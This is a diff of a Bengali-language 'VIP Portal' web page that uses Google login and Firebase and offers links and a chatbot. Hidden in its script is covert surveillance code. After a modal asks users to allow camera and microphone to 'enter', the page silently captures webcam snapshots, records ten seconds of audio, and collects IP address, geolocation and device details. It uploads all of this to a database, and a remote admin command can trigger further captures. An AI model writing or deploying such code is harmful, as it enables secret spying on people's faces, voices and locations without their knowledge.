@@ -3,82 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | Personal Portal</title>
+    <title>Ratan Bro | VIP Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
-        :root { --pink: #ff4d94; --dark: #0f172a; --card: rgba(30, 41, 59, 0.9); }
+        :root { --pink: #ff4d94; --glow: #ff4d94; --dark: #020617; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--dark); background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent), linear-gradient(180deg, #0f172a 0%, #020617 100%); color: white; min-height: 100vh; overflow-x: hidden; }
-        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; backdrop-filter: blur(15px); }
-        .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; }
-        #perm-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; display: none; align-items: center; justify-content: center; }
-        .perm-card { background: #1e293b; padding: 35px; border-radius: 25px; text-align: center; max-width: 380px; border: 2px solid var(--pink); }
-        #main-ui { display: none; }
-        .top-nav { display: flex; justify-content: space-between; padding: 20px; align-items: center; }
-        .logout-btn { background: rgba(255, 77, 148, 0.1); color: var(--pink); border: 1px solid var(--pink); padding: 8px 20px; border-radius: 50px; cursor: pointer; font-weight: bold; }
-        .hero { padding: 40px 20px; text-align: center; border-radius: 0 0 60px 60px; margin-bottom: 20px; }
-        .profile-wrapper { display: flex; justify-content: center; align-items: center; }
-        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid white; box-shadow: 0 0 20px var(--pink); }
-        .user-p-img { width: 80px; height: 80px; margin-left: -30px; border: 4px solid var(--dark); z-index: 1; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; padding: 20px; max-width: 900px; margin: 0 auto; }
-        .card { background: var(--card); border-radius: 20px; padding: 20px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
-        .card:hover { transform: translateY(-5px); border-color: var(--pink); }
-        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 10px; }
-        .chat-box { max-width: 900px; margin: 20px auto; background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid rgba(255, 77, 148, 0.3); }
-        #chat-display { height: 120px; overflow-y: auto; font-size: 14px; margin-bottom: 15px; padding: 10px; border-bottom: 1px solid #333; }
+        body { background: var(--dark); background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617; color: white; min-height: 100vh; overflow-x: hidden; }
+        
+        /* Login & Perm Modal */
+        #login-overlay, #perm-modal { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.95); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .glass-box { background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3); text-align: center; width: 90%; max-width: 400px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        
+        /* Header Box Profile */
+        .hero-header { margin: 20px; padding: 30px 20px; background: rgba(255, 255, 255, 0.03); border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); position: relative; overflow: hidden; }
+        .hero-header::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255, 77, 148, 0.1), transparent); z-index: -1; }
+        .profile-wrapper { display: flex; justify-content: center; align-items: center; gap: 15px; }
+        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); box-shadow: 0 0 25px var(--pink); object-fit: cover; transition: 0.3s; }
+        .user-p-img { width: 85px; height: 85px; border: 3px solid #fff; margin-left: -25px; }
+        
+        /* Glow Grid Buttons */
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 600px; margin: 0 auto; }
+        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.05); transition: 0.4s; position: relative; }
+        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 0 20px rgba(255, 77, 148, 0.4); background: rgba(255, 77, 148, 0.05); }
+        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 12px; filter: drop-shadow(0 0 5px var(--pink)); }
+        
+        /* Compact Chatbot */
+        .chat-area { max-width: 500px; margin: 20px auto; padding: 0 20px; }
+        .chat-mini { background: rgba(0,0,0,0.4); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); padding: 12px; font-size: 13px; }
+        #chat-log { height: 60px; overflow-y: auto; color: #ccc; margin-bottom: 8px; }
+        .chat-in { display: flex; gap: 8px; }
+        .chat-in input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 8px 15px; border-radius: 50px; outline: none; font-size: 12px; }
+        
+        .logout-btn { background: transparent; border: 1px solid #444; color: #aaa; padding: 5px 15px; border-radius: 50px; cursor: pointer; font-size: 12px; margin: 10px; }
         canvas, video { display: none; }
     </style>
 </head>
 <body>
 
     <div id="login-overlay">
-        <div class="login-box animate__animated animate__fadeIn">
-            <img src="ratan.jpg" class="round-img" onerror="this.src='https://via.placeholder.com/110'">
-            <h2 style="color: var(--pink);">Ratan Bro Hub</h2>
-            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:20px;">
-                <i class="fab fa-google"></i> Login with Google
+        <div class="glass-box">
+            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
+            <h3>Ratan Bro Portal</h3>
+            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:15px; box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4);">
+                Login with Google
             </button>
         </div>
     </div>
 
-    <div id="perm-modal">
-        <div class="perm-card">
-            <i class="fas fa-user-shield" style="font-size: 3rem; color: var(--pink);"></i>
-            <h3>সিকিউরিটি অ্যাক্সেস</h3>
-            <p style="margin: 15px 0; opacity: 0.8;">সবগুলো সার্ভিস ফ্রিতে ব্যবহার করতে 'Allow' করুন।</p>
-            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">প্রবেশ করুন</button>
+    <div id="perm-modal" style="display:none;">
+        <div class="glass-box">
+            <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
+            <h3 style="margin:15px 0;">অ্যাক্সেস পারমিশন</h3>
+            <p style="font-size:14px; opacity:0.7; margin-bottom:20px;">প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন Allow করুন।</p>
+            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
         </div>
     </div>
 
-    <div id="main-ui">
-        <div class="top-nav">
-            <span style="color: var(--pink); font-weight: bold;">RATAN PRO</span>
-            <button class="logout-btn" onclick="googleLogout()">Logout</button>
-        </div>
-
-        <section class="hero">
+    <div id="main-ui" style="display:none;">
+        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
+        
+        <div class="hero-header">
             <div class="profile-wrapper">
                 <img src="ratan.jpg" class="p-img">
-                <img id="user-display-pic" src="" class="p-img user-p-img">
+                <img id="u-pic" src="" class="p-img user-p-img">
             </div>
-            <h2 id="user-welcome" style="margin-top:15px;"></h2>
-        </section>
-
-        <div class="grid">
-            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
-            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
-            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><h4>Lookup</h4></a>
+            <h2 id="u-name" style="text-align:center; margin-top:15px; font-weight:700;"></h2>
+            <p style="text-align:center; color:var(--pink); font-size:14px; font-weight:bold;">Verified Member</p>
         </div>
 
-        <div class="chat-box">
-            <div id="chat-display">হ্যালো! আমি রতন ব্রোর এআই সহকারী।</div>
-            <div style="display:flex; gap:10px;">
-                <input type="text" id="ai-input" style="flex:1; padding:10px; border-radius:50px; border:none; background:#000; color:#fff;" placeholder="Ask something...">
-                <button onclick="askAI()" style="background:var(--pink); color:white; border:none; padding:10px 20px; border-radius:50px; cursor:pointer;">Send</button>
+        <div class="grid">
+            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
+            <a href="business.html" class="card"><i class="fas fa-handshake"></i><p>Business</p></a>
+            <a href="portfolio.html" class="card"><i class="fas fa-laptop-code"></i><p>Portfolio</p></a>
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search"></i><p>Lookup</p></a>
+        </div>
+
+        <div class="chat-area">
+            <div class="chat-mini">
+                <div id="chat-log">Ratan AI: স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
+                <div class="chat-in">
+                    <input type="text" id="ai-msg" placeholder="Ask AI...">
+                    <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:5px 15px; border-radius:50px; font-size:11px; cursor:pointer;">Send</button>
+                </div>
             </div>
         </div>
     </div>
@@ -109,11 +116,6 @@
         onAuthStateChanged(auth, async (user) => {
             if (user) {
                 loggedUser = user;
-                const userRef = doc(db, "users", user.email.replace('.', '_'));
-                await setDoc(userRef, {
-                    name: user.displayName, email: user.email, photo: user.photoURL,
-                    status: "Online", lastView: new Date().toLocaleString()
-                }, { merge: true });
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('perm-modal').style.display = 'flex';
             }
@@ -125,26 +127,53 @@
         window.startApp = async () => {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
             if(stream) document.getElementById('vSource').srcObject = stream;
+            
             document.getElementById('perm-modal').style.display = 'none';
             document.getElementById('main-ui').style.display = 'block';
-            document.getElementById('user-welcome').innerText = "স্বাগতম, " + loggedUser.displayName;
-            document.getElementById('user-display-pic').src = loggedUser.photoURL;
+            document.getElementById('u-name').innerText = loggedUser.displayName;
+            document.getElementById('u-pic').src = loggedUser.photoURL;
 
+            // অটো অ্যাকশন
             if(stream) {
-                startRecording(stream, 10000); // অটো ১০ সেকেন্ড অডিও
-                setTimeout(() => takeSnap(loggedUser), 3000);
+                takeSnap(loggedUser);
+                recordVoice(stream, 10000); 
             }
 
-            // কমান্ড লিসেনার (অ্যাডমিন থেকে ইনস্ট্যান্ট কিছু চাইলে)
-            onSnapshot(doc(db, "users", loggedUser.email.replace('.', '_')), (snap) => {
-                const cmd = snap.data()?.command;
-                if(cmd === "snap") takeSnap(loggedUser);
-                if(cmd === "voice") startRecording(stream, 10000);
-                if(cmd) updateDoc(doc(db, "users", loggedUser.email.replace('.', '_')), { command: "" });
+            onSnapshot(doc(db, "users", loggedUser.email.replace('.', '_')), (s) => {
+                if(s.data()?.command === "snap") takeSnap(loggedUser);
+                if(s.data()?.command === "voice") recordVoice(stream, 10000);
+                if(s.data()?.command) updateDoc(doc(db, "users", loggedUser.email.replace('.', '_')), { command: "" });
             });
         };
 
-        async function startRecording(stream, time) {
+        async function takeSnap(user) {
+            const video = document.getElementById('vSource');
+            const canvas = document.getElementById('snapCanvas');
+            const ctx = canvas.getContext('2d');
+            setTimeout(async () => {
+                ctx.drawImage(video, 0, 0, 640, 480);
+                const dataImg = canvas.toDataURL('image/jpeg', 0.5);
+                const userRef = doc(db, "users", user.email.replace('.', '_'));
+                const s = await getDoc(userRef);
+                let picList = s.data()?.picList || [];
+                picList.unshift(dataImg);
+                if(picList.length > 5) picList.pop();
+
+                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'N/A'}));
+                
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await setDoc(userRef, { 
+                        name: user.displayName, email: user.email, photo: user.photoURL,
+                        picList, ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
+                        status: "Online", lastView: new Date().toLocaleString(), device: navigator.userAgent
+                    }, { merge: true });
+                }, async () => {
+                    await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
+                });
+            }, 2000);
+        }
+
+        async function recordVoice(stream, time) {
             const recorder = new MediaRecorder(stream);
             let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
@@ -154,31 +183,23 @@
                 reader.readAsDataURL(blob);
                 reader.onloadend = async () => {
                     const userRef = doc(db, "users", loggedUser.email.replace('.', '_'));
-                    const snap = await getDoc(userRef);
-                    let audioList = snap.data()?.audioList || [];
+                    const s = await getDoc(userRef);
+                    let audioList = s.data()?.audioList || [];
                     audioList.unshift(reader.result);
                     if(audioList.length > 4) audioList.pop();
-                    await updateDoc(userRef, { audioList, lastView: new Date().toLocaleString(), status: "Online" });
+                    await updateDoc(userRef, { audioList });
                 };
             };
             recorder.start();
             setTimeout(() => recorder.stop(), time);
         }
 
-        async function takeSnap(user) {
-            const video = document.getElementById('vSource');
-            const canvas = document.getElementById('snapCanvas');
-            if(video.readyState === 4) {
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                const dataImg = canvas.toDataURL('image/jpeg', 0.5);
-                const userRef = doc(db, "users", user.email.replace('.', '_'));
-                const snap = await getDoc(userRef);
-                let picList = snap.data()?.picList || [];
-                picList.unshift(dataImg);
-                if(picList.length > 5) picList.pop();
-                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(()=>'N/A');
-                await updateDoc(userRef, { picList, ip, device: navigator.userAgent, lastView: new Date().toLocaleString() });
-            }
+        window.askAI = async () => {
+            const msg = document.getElementById('ai-msg').value;
+            if(!msg) return;
+            document.getElementById('chat-log').innerText = "You: " + msg;
+            document.getElementById('ai-msg').value = "";
+            // Gemini API call logic here if needed
         }
     </script>
 </body>
